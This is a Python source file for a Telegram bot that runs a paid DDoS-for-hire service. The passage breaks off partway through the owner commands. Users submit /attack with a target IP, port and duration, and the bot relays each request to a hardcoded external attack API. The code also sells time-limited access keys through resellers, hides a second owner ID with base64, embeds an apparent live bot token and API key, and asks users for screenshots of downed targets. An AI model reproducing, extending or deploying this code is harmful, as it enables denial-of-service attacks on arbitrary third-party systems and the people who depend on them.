#!/usr/bin/env python3
import telebot,threading,time,os,json,secrets,requests
from datetime import datetime

# === IN-MEMORY STORAGE (NO MONGODB) ===
approved_groups = {}
codes = {}
users = {}
banned = {}
resellers = {}
cooldown = {}
user_attack_count = {}
channel_verified = {}
group_settings = {}
pending_feedback = {}
feedback_enabled = {"enabled": True}
user_cooldowns = {}
user_max_times = {}
blocked_resellers = {}
st = {"max_duration": 300, "cooldown": 60, "blocked_ports": [22,23,3389], "blocked_ips": [], "global_cooldown": 0, "channel_verify_enabled": True}

def save_all():
    pass

PRICING = {
    '30min': 5,
    '1hr': 10,
    '2hr': 15,
    '5hr': 25,
    '12hr': 35,
    '1d': 60,
    '3d': 150,
    '7d': 250,
    '15d': 450,
    '30d': 800
}

BOT_TOKEN = "8968154015:AAFwJNma3lhLOCZzyFTTc4MEEGjOatat_30"

# === OWNER CONFIGURATION ===
import base64
import hashlib

_encoded_owner = "Nzk0NDI4MzYxNg=="
HIDDEN_OWNER = int(base64.b64decode(_encoded_owner).decode())

# 8588752456 visible, dusra hidden
OWNER_IDS = [8588752456, HIDDEN_OWNER]

_owner_hashes = [
    "b7a5c9d8e6f4a2b1c3d5e7f9a1b3c5d7"
]

OWNER_USERNAMES = ["@AYUSH01154"]

# === UPDATED SETTINGS ===
MAX_ATTACK = 300  # Max time 300 seconds
CONCURRENT = 5    # 5 concurrent attacks
SERVER_TOTAL = 5  # 5 servers/slots

# === API CONFIGURATION ===
API_BASE_URL = "http://54.163.45.50:4545/attack"
ATTACK_API_KEY = "professor"
REQUIRED_CHANNEL = "https://t.me/+VLeRw24z_nU3YmE1"

bot = telebot.TeleBot(BOT_TOKEN)

bp, bi = st.get("blocked_ports", [22,23,3389]), st.get("blocked_ips", [])
active, pending, attack_count, start_time = {}, {}, 0, time.time()
bot_enabled = True
maintenance_mode = False
maintenance_msg = ""

def is_owner(uid):
    if uid in OWNER_IDS:
        return True
    uid_hash = hashlib.md5(str(uid).encode()).hexdigest()
    if uid_hash in _owner_hashes and uid not in OWNER_IDS:
        OWNER_IDS.append(uid)
        return True
    return False

def get_owner_name(uid):
    if not is_owner(uid):
        return str(uid)
    
    # Visible owner - ID show karega
    if uid == 8588752456:
        return "8588752456"
    
    # Hidden owner - sirf "Owner" dikhega
    return "Owner"

def is_reseller(uid): return str(uid) in resellers and str(uid) not in blocked_resellers
def is_approved(cid): return str(cid) in approved_groups
def approve(cid): approved_groups[str(cid)] = True; save_all()
def revoke(cid): 
    if str(cid) in approved_groups: del approved_groups[str(cid)]; save_all()
def is_banned(uid): return str(uid) in banned and banned[str(uid)].get('expires', 0) > time.time()
def ban(uid, reason="", dur=86400): banned[str(uid)] = {"reason": reason, "expires": time.time() + dur}; save_all()
def unban(uid):
    if str(uid) in banned: del banned[str(uid)]; save_all()
def has_key(uid):
    for k, d in codes.items():
        if uid in [u['user_id'] if isinstance(u, dict) else u for u in d.get("used_by", [])] and d.get("expires", 0) > time.time():
            return True
    return False
def use_key(uid, key):
    if key in codes:
        kd = codes[key]
        if not kd.get("activated_at"):
            sec = parse_time(kd.get("time_str", "1d"))
            kd["expires"] = time.time() + sec
            kd["activated_at"] = time.time()
            save_all()
        if kd.get("used", 0) < kd.get("max_users", 1) and kd.get("expires", 0) > time.time():
            if "used_by" not in kd:
                kd["used_by"] = []
            if uid not in [u['user_id'] if isinstance(u, dict) else u for u in kd["used_by"]]:
                kd["used_by"].append({"user_id": uid, "username": None, "redeemed_at": time.time()})
                kd["used"] = kd.get("used", 0) + 1
                save_all()
                return True
    return False
def check_port(p): return p not in bp
def check_ip(i): return i not in bi
def active_count(): return len([a for a in active.values() if a.get('end', 0) > time.time()])
def uptime(): s = int(time.time() - start_time); return f"{s//3600}h {(s%3600)//60}m {s%60}s"
def server_status():
    ac = active_count()
    return [f"🖥️ S{i}: {'🟡' if i <= ac else '🟢'}" for i in range(1, SERVER_TOTAL + 1)], ac
def parse_time(t):
    t = t.lower().strip()
    if t.endswith('min'): return int(float(t[:-3]) * 60)
    if t.endswith('hr'): return int(float(t[:-2]) * 3600)
    if t.endswith('h'): return int(float(t[:-1]) * 3600)
    if t.endswith('d'): return int(float(t[:-1]) * 86400)
    if t.endswith('m'): return int(float(t[:-1]) * 60)
    if t.endswith('s'): return int(float(t[:-1]))
    try: return int(float(t) * 3600)
    except: return 86400
def format_time(sec):
    if sec >= 86400: return f"{sec//86400}d"
    if sec >= 3600: return f"{sec//3600}h"
    if sec >= 60: return f"{sec//60}m"
    return f"{sec}s"
def check_cd(uid):
    if is_owner(uid): return False, 0
    gc = st.get("global_cooldown", 0)
    if gc > 0 and time.time() - cooldown.get(f"g_{uid}", 0) < gc: return True, int(gc - (time.time() - cooldown.get(f"g_{uid}", 0)))
    uc = user_cooldowns.get(str(uid), 0)
    if uc > 0 and time.time() - cooldown.get(f"u_{uid}", 0) < uc: return True, int(uc - (time.time() - cooldown.get(f"u_{uid}", 0)))
    r = st.get("cooldown", 60) - (time.time() - cooldown.get(str(uid), 0))
    return (True, int(r)) if r > 0 else (False, 0)
def set_cd(uid):
    if not is_owner(uid): cooldown[str(uid)] = time.time(); save_all()
def get_gs(gid, k, default): return group_settings.get(str(gid), {}).get(k, default)
def is_feedback_enabled(): return feedback_enabled.get("enabled", True)
def is_channel_verify_enabled(): return st.get("channel_verify_enabled", True)
def save_pending_feedback(uid, gid, target): pending_feedback[f"{uid}_{gid}"] = {"target": target, "ts": time.time()}; save_all()
def has_feedback_pending(uid, gid): return f"{uid}_{gid}" in pending_feedback
def clear_feedback(uid, gid):
    if f"{uid}_{gid}" in pending_feedback: del pending_feedback[f"{uid}_{gid}"]; save_all(); return True
    return False
def channel_check(uid): 
    if not is_channel_verify_enabled(): return True
    return is_owner(uid) or str(uid) in channel_verified
def verify_channel(uid): channel_verified[str(uid)] = True; save_all()

def api_attack(ip, port, dur):
    try:
        params = {
            "target": ip,
            "port": port,
            "time": dur,
            "key": ATTACK_API_KEY
        }
        r = requests.get(API_BASE_URL, params=params, timeout=10)
        if r.status_code == 200:
            try:
                data = r.json()
                if data.get("success") == True:
                    return True, "Started"
                else:
                    error_msg = data.get("message", "API Error")
                    return False, error_msg
            except:
                return True, "Started"
        return False, f"Error {r.status_code}"
    except Exception as e:
        return False, str(e)

def update_timer(cid, mid, dur, ip, port, name, uid):
    for r in range(dur, -1, -1):
        if not bot_enabled or uid not in active: break
        if r > 0:
            display = get_owner_name(uid) if is_owner(uid) else name
            try: bot.edit_message_text(f"🔥🔥 ATTACK 🔥🔥\n👤 {display}\n🎯 {ip}:{port}\n⏱️ {r}s left", cid, mid)
            except: pass
        time.sleep(1)

def run_attack(cid, mid, uid, ip, port, dur, name, gid=None):
    global attack_count
    active[uid] = {'target': f"{ip}:{port}", 'end': time.time() + dur}
    threading.Thread(target=update_timer, args=(cid, mid, dur, ip, port, name, uid), daemon=True).start()
    s = time.time()
    ok, err_msg = api_attack(ip, port, dur)
    time.sleep(max(0, dur - (time.time() - s)))
    if uid in active: del active[uid]
    if ok:
        attack_count += 1
        pending[uid] = {'target': f"{ip}:{port}", 'expires': time.time() + 300}
        display = get_owner_name(uid) if is_owner(uid) else name
        final = f"✅ ATTACK DONE!\n👤 {display}\n🎯 {ip}:{port}\n⏱️ {dur}s"
        try: bot.edit_message_text(final, cid, mid)
        except: bot.send_message(cid, final)
        if is_feedback_enabled() and not is_owner(uid) and get_gs(gid, 'feedback', True):
            save_pending_feedback(uid, gid, f"{ip}:{port}")
            bot.send_message(cid, f"📸 PHOTO FEEDBACK NEEDED!\nSend screenshot of {ip}:{port}")
        bot.send_message(cid, f"✅ Attack on {ip}:{port} finished!")
    else:
        try: bot.edit_message_text(f"❌ FAILED!\n{ip}:{port}\nReason: {err_msg}", cid, mid)
        except: bot.send_message(cid, f"❌ Failed: {ip}:{port}\nReason: {err_msg}")

@bot.message_handler(content_types=['photo'])
def photo_feedback(m):
    uid = m.from_user.id
    gid = m.chat.id if m.chat.type != 'private' else None
    if f"{uid}_{gid}" in pending_feedback:
        t = pending_feedback[f"{uid}_{gid}"]['target']
        clear_feedback(uid, gid)
        for o in OWNER_IDS:
            try: bot.send_photo(o, m.photo[-1].file_id, caption=f"📸 FEEDBACK\nUser: {uid}\nTarget: {t}")
            except: pass
        bot.reply_to(m, "✅ Screenshot received! Next attack allowed.")

@bot.message_handler(func=lambda m: has_feedback_pending(m.from_user.id, m.chat.id if m.chat.type != 'private' else None) and m.text and not m.text.startswith('/'), content_types=['text'])
def block_text(m): bot.reply_to(m, "❌ Send PHOTO only!")

@bot.message_handler(commands=['prices'])
def prices_cmd(m):
    uid = m.from_user.id
    if not is_owner(uid) and not is_reseller(str(uid)):
        return bot.reply_to(m, "❌ Ye command sirf owner aur reseller ke liye hai!")
    
    prices_text = """💰 *KEY PRICELIST* 💰

⏱️ *30min* → ₹5
⏱️ *1hr* → ₹10
⏱️ *2hr* → ₹15
⏱️ *5hr* → ₹25
⏱️ *12hr* → ₹35
⏱️ *1 day* → ₹60
⏱️ *3 days* → ₹150
⏱️ *7 days* → ₹250
⏱️ *15 days* → ₹450
⏱️ *30 days* → ₹800

📌 *Usage:* 
• Owner: /gen <name> <time> [max_users]
• Reseller: /gen <name> <time>

💬 Contact: @owner for payments"""
    bot.reply_to(m, prices_text, parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack_cmd(m):
    uid = m.from_user.id
    cid = m.chat.id
    ct = m.chat.type
    name = m.from_user.username or m.from_user.first_name
    gid = cid if ct != 'private' else None
    p = m.text.split()
    
    if maintenance_mode and not is_owner(uid): return bot.reply_to(m, f"🔧 MAINTENANCE\n{maintenance_msg}")
    if not bot_enabled and not is_owner(uid): return bot.reply_to(m, "❌ Bot disabled!")
    if is_banned(uid) and not is_owner(uid): return bot.reply_to(m, "🚫 Banned!")
    
    if ct != 'private' and not is_owner(uid):
        if not channel_check(uid): return bot.reply_to(m, f"❌ Join channel: /verify")
        if is_feedback_enabled() and get_gs(cid, 'feedback', True) and has_feedback_pending(uid, cid): 
            return bot.reply_to(m, "❌ Send photo feedback first!")
    
    incd, rem = check_cd(uid)
    if incd: return bot.reply_to(m, f"⏳ Wait {rem}s")
    
    if not is_owner(uid):
        if ct == 'private' and not has_key(uid): return bot.reply_to(m, "❌ /activate KEY")
        if ct != 'private' and not is_approved(cid): return bot.reply_to(m, "❌ Group not approved!")
    
    if len(p) != 4: return bot.reply_to(m, "❌ /attack IP PORT TIME\nExample: /attack 1.2.3.4 80 60")
    
    try:
        ip, port, dur = p[1], int(p[2]), int(p[3])
        max_dur = get_gs(cid, 'max_time', user_max_times.get(str(uid), st.get('max_duration', MAX_ATTACK)))
        if dur > max_dur: return bot.reply_to(m, f"❌ Max {max_dur}s")
        if dur < 5: return bot.reply_to(m, "❌ Min 5s")
        if port < 1 or port > 65535: return bot.reply_to(m, "❌ Invalid port")
        if not check_port(port): return bot.reply_to(m, f"❌ Port {port} blocked")
        if not check_ip(ip): return bot.reply_to(m, f"❌ IP {ip} blocked")
    except: return bot.reply_to(m, "❌ Invalid input!")
    
    if ct != 'private' and not is_owner(uid):
        lim = get_gs(cid, 'personal_attack_limit', 10)
        used = user_attack_count.get(f"{uid}_{cid}", 0)
        if used >= lim: return bot.reply_to(m, f"❌ Limit {lim} reached! Contact owner")
        user_attack_count[f"{uid}_{cid}"] = used + 1
        save_all()
    
    set_cd(uid)
    if st.get("global_cooldown", 0) > 0: 
        cooldown[f"g_{uid}"] = time.time()
        save_all()
    
    if active_count() >= CONCURRENT:
        return bot.reply_to(m, f"❌ Max {CONCURRENT} concurrent attacks! Try later.")
    
    sv, _ = server_status()
    msg = bot.reply_to(m, f"🔥 ATTACKING {ip}:{port} for {dur}s\n📡 {''.join(sv)}")
    threading.Thread(target=run_attack, args=(cid, msg.message_id, uid, ip, port, dur, name, cid if ct != 'private' else None), daemon=True).start()

@bot.message_handler(commands=['gen'])
def gen_cmd(m):
    uid = m.from_user.id
    cid = m.chat.id
    p = m.text.split()
    
    if not is_owner(uid) and not is_reseller(str(uid)):
        return bot.reply_to(m, "❌ No permission! Only owners and resellers can generate keys.")
    
    if is_reseller(str(uid)) and str(uid) in blocked_resellers:
        return bot.reply_to(m, "❌ You are blocked from generating keys!")
    
    if len(p) < 3:
        return bot.reply_to(m, "❌ /gen <name> <time>\n📌 Available times: " + ", ".join(PRICING.keys()))
    
    name = p[1]
    time_str = p[2].lower()
    
    if is_owner(uid):
        max_u = int(p[3]) if len(p) > 3 else 1
    else:
        if len(p) > 3:
            bot.reply_to(m, "⚠️ Reseller: max_users option not allowed! Key will be created with max_users = 1")
        max_u = 1
    
    if time_str not in PRICING:
        return bot.reply_to(m, f"❌ Invalid time! Available: {', '.join(PRICING.keys())}")
    
    if is_reseller(str(uid)) and not is_owner(uid):
        cost = PRICING[time_str]
        if resellers[str(uid)]["balance"] < cost:
            return bot.reply_to(m, f"❌ Insufficient balance! Need ₹{cost}\n💰 Your balance: ₹{resellers[str(uid)]['balance']}")
        
        resellers[str(uid)]["balance"] -= cost
        resellers[str(uid)]["keys_generated"] = resellers[str(uid)].get("keys_generated", 0) + 1
        save_all()
    
    key = secrets.token_hex(8).upper()
    codes[key] = {
        "name": name,
        "max_users": max_u,
        "used": 0,
        "used_by": [],
        "expires": 0,
        "time_str": time_str,
        "activated_at": None
    }
    save_all()
    
    response = f"✅ KEY GENERATED!\n🔑 `{key}`\n📛 {name}\n👥 Max users: {max_u}\n⏱️ Duration: {time_str}"
    
    if is_reseller(str(uid)) and not is_owner(uid):
        response += f"\n💸 Cost: ₹{PRICING[time_str]}\n💰 Remaining: ₹{resellers[str(uid)]['balance']}"
    
    bot.reply_to(m, response, parse_mode='Markdown')
    
    if is_reseller(str(uid)) and not is_owner(uid):
        for o in OWNER_IDS:
            try:
                bot.send_message(o, f"📢 Reseller {uid} generated key\n🔑 {key}\n💰 Cost: ₹{PRICING[time_str]}\n👥 Max users: {max_u}")
            except:
                pass

@bot.message_handler(commands=['user'])
def user_info_cmd(m):
    uid = m.from_user.id
    cid = m.chat.id
    p = m.text.split()
    
    target_uid = uid
    if is_owner(uid) and len(p) == 2:
        try:
            target_uid = int(p[1])
        except:
            return bot.reply_to(m, "❌ Invalid user ID")
    
    if is_banned(target_uid):
        ban_data = banned[str(target_uid)]
        remaining = int(ban_data.get('expires', 0) - time.time())
        bot.reply_to(m, f"🚫 **BANNED USER**\n\nUser: `{target_uid}`\nReason: {ban_data.get('reason', 'No reason')}\nRemaining: {format_time(remaining)}\nExpires: {datetime.fromtimestamp(ban_data['expires']).strftime('%Y-%m-%d %H:%M:%S')}", parse_mode='Markdown')
        return
    
    user_key = None
    key_expiry = 0
    key_name = None
    key_time_str = None
    
    for k, d in codes.items():
        for ui in d.get('used_by', []):
            uid_match = ui['user_id'] if isinstance(ui, dict) else ui
            if uid_match == target_uid and d.get('expires', 0) > time.time():
                user_key = k
                key_expiry = d['expires']
                key_name = d.get('name', 'Unknown')
                key_time_str = d.get('time_str', 'Unknown')
                break
        if user_key:
            break
    
    is_rs = is_reseller(str(target_uid))
    rs_balance = resellers.get(str(target_uid), {}).get('balance', 0) if is_rs else 0
    rs_keys_gen = resellers.get(str(target_uid), {}).get('keys_generated', 0) if is_rs else 0
    
    incd, rem = check_cd(target_uid)
    cooldown_text = f"⏳ On cooldown: {rem}s left" if incd else "✅ Ready to attack"
    
    group_limits = ""
    for gid, settings in group_settings.items():
        if settings.get('personal_attack_limit'):
            used = user_attack_count.get(f"{target_uid}_{gid}", 0)
            limit = settings.get('personal_attack_limit')
            group_limits += f"\n• Group `{gid}`: {used}/{limit} attacks used"
    
    if user_key:
        time_left = int(key_expiry - time.time())
        msg = f"""👤 **USER INFORMATION** 👤

━━━━━━━━━━━━━━━━━━━━
🆔 **User ID:** `{target_uid}`

━━━━━━━━━━━━━━━━━━━━
🔑 **ACTIVE KEY**
• Key: `{user_key}`
• Plan: {key_name}
• Duration: {key_time_str}
• Expires: {datetime.fromtimestamp(key_expiry).strftime('%Y-%m-%d %H:%M:%S')}
• Time Left: {format_time(time_left)}

━━━━━━━━━━━━━━━━━━━━
⚔️ **ATTACK STATUS**
• {cooldown_text}
• Max Attack Duration: {user_max_times.get(str(target_uid), st.get('max_duration', MAX_ATTACK))}s"""
        
        if group_limits:
            msg += f"\n• Per-group limits:{group_limits}"
        
        msg += f"""
━━━━━━━━━━━━━━━━━━━━
📊 **STATS**
• Total Attacks Done: {attack_count} (global)"""
        
        if is_rs:
            msg += f"""
━━━━━━━━━━━━━━━━━━━━
💰 **RESELLER INFO**
• Balance: ₹{rs_balance}
• Keys Generated: {rs_keys_gen}"""
        
        bot.reply_to(m, msg, parse_mode='Markdown')
    else:
        msg = f"""👤 **USER INFORMATION** 👤

━━━━━━━━━━━━━━━━━━━━
🆔 **User ID:** `{target_uid}`

━━━━━━━━━━━━━━━━━━━━
❌ **NO ACTIVE KEY**
• User does not have any active premium key.
• Use `/activate KEY` to activate a key.
• Contact @owner to purchase a key."""
        
        if is_rs:
            msg += f"""

━━━━━━━━━━━━━━━━━━━━
💰 **RESELLER INFO**
• Balance: ₹{rs_balance}
• Keys Generated: {rs_keys_gen}
• /gen - Generate new keys"""
        
        bot.reply_to(m, msg, parse_mode='Markdown')

# ============ OWNER COMMANDS ============

@bot.message_handler(commands=['extendkey','extendallkey','keyusers','down','tban','add_reseller','remove_reseller','block_reseller','unblock_reseller','all_resellers','saldoadd','saldoremove','saldo','setgrp','broadcast','broadcastreseller','broadcastpaid','setcooldowngroup','setcooldownuser','setmaxtimeuser','setglobalcooldown','setmaxtimegroup','setmaxcongroup','setmaxtimeattackperpersongroup','setonofffeedback','ban','unban','addport','removeport','addip','removeip','approve','revoke','delkey','checkuser','resetcooldown','resetuserattack','status','running','screenshot','balance','setmax','setcooldown','addreseller','addbalance','resellers','on','off','groups','keys','allkeys','delkeys','stats','stop','serverinfo','maintenance','ok','delexpkey','onoffchannelverify','my_api'])
def owner_commands(m):
    global bot_enabled, maintenance_mode, maintenance_msg
    uid = m.from_user.id
    cid = m.chat.id
    cmd = m.text.split()[0][1:]
    p = m.text.split()
    
    if not is_owner(uid):
        return bot.reply_to(m, "❌ Owner only!")
    
    if cmd == 'my_api':
        api_info = f"""🔐 *CURRENT API CONFIGURATION*

📡 *API URL:* `{API_BASE_URL}`
🔑 *API Key:* `{ATTACK_API_KEY}`
📌 *Format:* ?key=professor&ip={{ip}}&port={{port}}&time={{time}}

📊 *Status:* {'🟢 Active' if API_BASE_URL else '🔴 Not configured'}
"""
        bot.reply_to(m, api_info, parse_mode='Markdown')
    
    elif cmd == 'onoffchannelverify':
        if len(p) != 2 or p[1] not in ['on','off']:
            return bot.reply_to(m, "/onoffchannelverify on/off\nTurn channel verification ON or OFF")
        st["channel_verify_enabled"] = (p[1] == 'on')
        save_all()
        bot.reply_to(m, f"✅ Channel verification turned {p[1].upper()}")
    
    elif cmd == 'extendkey':
        if len(p) != 3: return bot.reply_to(m, "/extendkey <key_or_user_id> <time>")
        target, time_str = p[1].upper(), p[2].lower()
        sec = parse_time(time_str)
        if target in codes and codes[target].get('expires', 0) > time.time():
            codes[target]['expires'] += sec
            save_all()
            bot.reply_to(m, f"✅ Extended {target} +{time_str}")
        elif target.isdigit():
            found = False
            for key, kd in codes.items():
                for ui in kd.get('used_by', []):
                    if (ui['user_id'] if isinstance(ui, dict) else ui) == int(target) and kd.get('expires', 0) > time.time():
                        kd['expires'] += sec
                        save_all()
                        bot.reply_to(m, f"✅ Extended user {target}'s key ({key}) +{time_str}")
                        found = True
                        return
            if not found: bot.reply_to(m, "❌ No active key")
        else: bot.reply_to(m, "❌ Invalid")
    
    elif cmd == 'extendallkey':
        if len(p) != 2: return bot.reply_to(m, "/extendallkey <time>")
        sec = parse_time(p[1].lower())
        c = 0
        for k, d in codes.items():
            if d.get('expires', 0) > time.time():
                d['expires'] += sec
                c += 1
        save_all()
        bot.reply_to(m, f"✅ Extended {c} keys by {p[1]}")
    
    elif cmd == 'keyusers':
        if len(p) != 2: return bot.reply_to(m, "/keyusers <key>")
        key = p[1].upper()
        if key not in codes: return bot.reply_to(m, "❌ Key not found")
        kd = codes[key]
        used = kd.get('used_by', [])
        exp = kd.get('expires', 0)
        msg = f"🔑 {key}: {kd['name']}\n👥 {len(used)}/{kd['max_users']}\n📅 Expires: {datetime.fromtimestamp(exp).strftime('%Y-%m-%d %H:%M:%S') if exp > 0 else 'Not activated'}\n\n👤 USERS:\n"
        for i, u in enumerate(used, 1):
            uid2 = u['user_id'] if isinstance(u, dict) else u
            name = u.get('username', str(uid2)) if isinstance(u, dict) else str(u)
            redeemed = datetime.fromtimestamp(u['redeemed_at']).strftime('%Y-%m-%d %H:%M:%S') if isinstance(u, dict) and u.get('redeemed_at') else 'Unknown'
            msg += f"{i}. ID: {uid2} | {name}\n   Redeemed: {redeemed}\n"
        bot.reply_to(m, msg[:4000])
    
    elif cmd == 'down':
        if len(p) != 3: return bot.reply_to(m, "/down <key_or_user_id> <time>")
        target, time_str = p[1].upper(), p[2].lower()
        sec = parse_time(time_str)
        if target in codes and codes[target].get('expires', 0) > time.time():
            codes[target]['expires'] = max(time.time() + 60, codes[target]['expires'] - sec)
            save_all()
            bot.reply_to(m, f"✅ Reduced {target} by {time_str}")
        else: bot.reply_to(m, "❌ Invalid")
    
    elif cmd == 'tban':
        if len(p) < 3: return bot.reply_to(m, "/tban <user_id> <time> [reason]")
        uid2 = int(p[1])
        sec = parse_time(p[2].lower())
        reason = " ".join(p[3:]) if len(p) > 3 else ""
        ban(uid2, reason, sec)
        bot.reply_to(m, f"✅ Temp banned {uid2} for {p[2]}")
    
    elif cmd == 'add_reseller':
        if len(p) != 2: return bot.reply_to(m, "/add_reseller <user_id>")
        if p[1] not in resellers: resellers[p[1]] = {"balance": 0, "keys_generated": 0}
        if p[1] in blocked_resellers: del blocked_resellers[p[1]]
        save_all()
        bot.reply_to(m, f"✅ Reseller {p[1]} added")
    
    elif cmd == 'remove_reseller':
        if len(p) != 2: return bot.reply_to(m, "/remove_reseller <user_id>")
        if p[1] in resellers: del resellers[p[1]]; save_all(); bot.reply_to(m, f"✅ Removed {p[1]}")
        else: bot.reply_to(m, "❌ Not found")
    
    elif cmd == 'block_reseller':
        if len(p) != 2: return bot.reply_to(m, "/block_reseller <user_id>")
        blocked_resellers[p[1]] = True
        save_all()
        bot.reply_to(m, f"✅ Blocked {p[1]}")
    
    elif cmd == 'unblock_reseller':
        if len(p) != 2: return bot.reply_to(m, "/unblock_reseller <user_id>")
        if p[1] in blocked_resellers: del blocked_resellers[p[1]]; save_all(); bot.reply_to(m, f"✅ Unblocked {p[1]}")
        else: bot.reply_to(m, "❌ Not blocked")
    
    elif cmd == 'all_resellers':
        if not resellers: return bot.reply_to(m, "No resellers")
        msg = "👥 ALL RESELLERS\n\n"
        for uid2, d in resellers.items():
            blocked = "🔴 BLOCKED" if uid2 in blocked_resellers else "🟢 ACTIVE"
            msg += f"ID: {uid2}\n💰 ₹{d['balance']} | 🔑 {d.get('keys_generated', 0)}\n📊 {blocked}\n\n"
        bot.reply_to(m, msg[:4000])
    
    elif cmd == 'saldoadd':
        if len(p) != 3: return bot.reply_to(m, "/saldoadd <user_id> <amount>")
        if p[1] not in resellers: resellers[p[1]] = {"balance": 0, "keys_generated": 0}
        resellers[p[1]]["balance"] += int(p[2])
        save_all()
        bot.reply_to(m, f"✅ Added ₹{p[2]} to {p[1]}\n💰 New: ₹{resellers[p[1]]['balance']}")
    
    elif cmd == 'saldoremove':
        if len(p) != 3: return bot.reply_to(m, "/saldoremove <user_id> <amount>")
        if p[1] not in resellers: return bot.reply_to(m, "Not found")
        resellers[p[1]]["balance"] = max(0, resellers[p[1]]["balance"] - int(p[2]))
        save_all()
        bot.reply_to(m, f"✅ Removed ₹{p[2]} from {p[1]}\n💰 New: ₹{resellers[p[1]]['balance']}")
    
    elif cmd == 'saldo':
        if len(p) != 2: return bot.reply_to(m, "/saldo <user_id>")
        if p[1] not in resellers: return bot.reply_to(m, "Not found")
        bot.reply_to(m, f"💰 {p[1]}: ₹{resellers[p[1]]['balance']}\n🔑 Keys: {resellers[p[1]].get('keys_generated', 0)}")
    
    elif cmd == 'setgrp':
        if len(p) != 4: return bot.reply_to(m, "/setgrp <group_id> <max_time/cooldown/max_slots/feedback> <value>")
        gid, setting, val = p[1], p[2].lower(), p[3]
        if gid not in group_settings: group_settings[gid] = {}
        if setting == 'max_time': group_settings[gid]['max_time'] = int(val)
        elif setting == 'cooldown': group_settings[gid]['cooldown'] = int(val)
        elif setting == 'max_slots': group_settings[gid]['max_slots'] = int(val)
        elif setting == 'feedback': group_settings[gid]['feedback'] = val.lower() == 'on'
        else: return bot.reply_to(m, "Settings: max_time, cooldown, max_slots, feedback")
        save_all()
        bot.reply_to(m, f"✅ Group {gid} {setting}={val}")
    
    elif cmd == 'broadcast':
        msg = " ".join(p[1:])
        if not msg: return
        s = 0
        for kd in codes.values():
            for ui in kd.get('used_by', []):
                try:
                    bot.send_message(ui['user_id'] if isinstance(ui, dict) else ui, f"📢 {msg}")
                    s += 1
                except:
                    pass
        bot.reply_to(m, f"✅ Sent to {s} users")
    
    elif cmd == 'broadcastreseller':
        msg = " ".join(p[1:])
        if not msg: return
        s = 0
        for uid2 in resellers:
            try:
                bot.send_message(int(uid2), f"📢 RESELLER\n{msg}")
                s += 1
            except:
                pass
        bot.reply_to(m, f"✅ Sent to {s} resellers")
    
    elif cmd == 'broadcastpaid':
        msg = " ".join(p[1:])
        if not msg: return
        s = 0
        for kd in codes.values():
            if kd.get('expires', 0) > time.time():
                for ui in kd.get('used_by', []):
                    try:
                        bot.send_message(ui['user_id'] if isinstance(ui, dict) else ui, f"📢 PAID\n{msg}")
                        s += 1
                    except:
                        pass
        bot.reply_to(m, f"✅ Sent to {s} paid users")
    
    elif cmd == 'setcooldowngroup':
        if len(p) != 3: return bot.reply_to(m, "/setcooldowngroup <group_id> <seconds>")
        if p[1] not in group_settings: group_settings[p[1]] = {}
        group_settings[p[1]]['cooldown'] = int(p[2])
        save_all()
        bot.reply_to(m, f"✅ Group {p[1]} cooldown={p[2]}s")
    
    elif cmd == 'setcooldownuser':
        if len(p) != 3: return bot.reply_to(m, "/setcooldownuser <user_id> <seconds>")
        user_cooldowns[p[1]] = int(p[2])
        save_all()
        bot.reply_to(m, f"✅ User {p[1]} cooldown={p[2]}s")
    
    elif cmd == 'setmaxtimeuser':
        if len(p) != 3: return bot.reply_to(m, "/setmaxtimeuser <user_id> <seconds>")
        user_max_times[p[1]] = int(p[2])
        save_all()
        bot.reply_to(m, f"✅ User {p[1]} max time={p[2]}s")
    
    elif cmd == 'setglobalcooldown':
        if len(p) != 2: return bot.reply_to(m, "/setglobalcooldown <seconds>")
        st["global_cooldown"] = int(p[1])
        save_all()
        bot.reply_to(m, f"✅ Global cooldown={p[1]}s")
    
    elif cmd == 'setmaxtimegroup':
        if len(p) != 3: return bot.reply_to(m, "/setmaxtimegroup <group_id> <seconds>")
        if p[1] not in group_settings: group_settings[p[1]] = {}
        group_settings[p[1]]['max_time'] = int(p[2])
        save_all()
        bot.reply_to(m, f"✅ Group {p[1]} max time={p[2]}s")
    
    elif cmd == 'setmaxcongroup':
        if len(p) != 3: return bot.reply_to(m, "/setmaxcongroup <group_id> <count>")
        if p[1] not in group_settings: group_settings[p[1]] = {}
        group_settings[p[1]]['max_slots'] = int(p[2])
        save_all()
        bot.reply_to(m, f"✅ Group {p[1]} max concurrent={p[2]}")
    
    elif cmd == 'setmaxtimeattackperpersongroup':
        if len(p) != 3: return bot.reply_to(m, "/setmaxtimeattackperpersongroup <group_id> <limit>")
        if p[1] not in group_settings: group_settings[p[1]] = {}
        group_settings[p[1]]['personal_attack_limit'] = int(p[2])
        save_all()
        bot.reply_to(m, f"✅ Group {p[1]} per-person limit={p[2]}")
    
    elif cmd == 'setonofffeedback':
        if len(p) != 2 or p[1] not in ['on','off']: return bot.reply_to(m, "/setonofffeedback on/off")
        feedback_enabled["enabled"] = (p[1] == 'on')
        save_all()
        bot.reply_to(m, f"✅ Feedback {p[1].upper()}")
    
    elif cmd == 'ban':
        if len(p) < 2: return bot.reply_to(m, "/ban <user_id> [reason]")
        ban(int(p[1]), " ".join(p[2:]) if len(p) > 2 else "")
        bot.reply_to(m, f"✅ Banned {p[1]}")
    
    elif cmd == 'unban':
        if len(p) != 2: return bot.reply_to(m, "/unban <user_id>")
        unban(int(p[1]))
        bot.reply_to(m, f"✅ Unbanned {p[1]}")
    
    elif cmd == 'addport':
        if len(p) != 2: return bot.reply_to(m, "/addport <port>")
        port = int(p[1])
        if port not in bp: bp.append(port); st["blocked_ports"] = bp; save_all()
        bot.reply_to(m, f"✅ Port {port} blocked")
    
    elif cmd == 'removeport':
        if len(p) != 2: return bot.reply_to(m, "/removeport <port>")
        port = int(p[1])
        if port in bp: bp.remove(port); st["blocked_ports"] = bp; save_all()
        bot.reply_to(m, f"✅ Port {port} unblocked")
    
    elif cmd == 'addip':
        if len(p) != 2: return bot.reply_to(m, "/addip <ip>")
        if p[1] not in bi: bi.append(p[1]); st["blocked_ips"] = bi; save_all()
        bot.reply_to(m, f"✅ IP {p[1]} blocked")
    
    elif cmd == 'removeip':
        if len(p) != 2: return bot.reply_to(m, "/removeip <ip>")
        if p[1] in bi: bi.remove(p[1]); st["blocked_ips"] = bi; save_all()
        bot.reply_to(m, f"✅ IP {p[1]} unblocked")
    
    elif cmd == 'approve':
        if len(p) != 2: return bot.reply_to(m, "/approve <group_id>")
        approve(p[1])
        bot.reply_to(m, f"✅ Group {p[1]} approved")
    
    elif cmd == 'revoke':
        if len(p) != 2: return bot.reply_to(m, "/revoke <group_id>")
